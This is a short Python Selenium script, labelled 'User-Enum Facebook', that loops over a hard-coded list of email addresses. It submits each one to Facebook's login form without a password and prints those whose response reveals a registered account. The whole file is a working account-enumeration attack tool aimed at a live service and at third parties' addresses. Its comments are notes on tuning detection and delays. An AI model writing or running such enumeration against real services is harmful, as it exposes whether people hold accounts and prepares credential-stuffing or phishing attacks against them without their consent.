#  User-Enum Facebook
# NO NEED OF PASSWORD. SO MAY WORK WITH runProgram()
# FILTER ON username present message ie "The password you’ve entered is incorrect. ". Filtering on Username NOT #present message is not working properly
# Try both the messages ..  ALSO, sleep is needed AFTER RETURN
# ENTIRE MESSAGE ON WEBSITE:     The password you’ve entered is incorrect. Forgot Password?
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep

driver = webdriver.Edge(executable_path='msedgedriver')

print("The Usernames present in Facebook are: ")
for i in ["ccabsdjh2aohen@aol.com", "superman@gmail.com", "keijser@aol.com", "ajohnson@hotmail.com", "rnewman@aol.com",
          "sfoskett@hotmail.com", "seurat@aol.com", "richard@gmail.com", "punkis@gmail.com", "jadavis@outlook.com",
          "staffelb@att.net", "pplinux@icloud.com", "lamky@optonline.net", "ccoerhen@aol.com", "keijserqer@aol.com",
          "ajohneesdson@hotmail.com", "rnewman@aol.com", "sfosksdett@hotmail.com", "seusdrat@aol.com",
          "richard@gmail.com", "pssunkis@gmail.com", "jadavssis@outlook.com", "stafssfelb@att.net",
          "pplinsdux@icloud.com", "laamky@optonline.net"]:

    user = i
    # passw = 'qwertyzxcvbnASDF!@34'

    driver.get("https://www.facebook.com/")

    elem = driver.find_element_by_xpath("//input[@type='text']")  # type = 'text'/'email'
    elem.send_keys(user)
    # elem = driver.find_element_by_xpath("//input[@type='password']")
    # elem.send_keys(passw)
    elem.send_keys(Keys.RETURN)
    sleep(3)  # sleep important here in case of facebook, cause correct username authentication takes some time to load
    p1 = driver.page_source
    #if "The password you’ve entered is incorrect. " in p1:
    if "The password you’ve entered is incorrect." in p1:
        print(i)
    sleep(3)


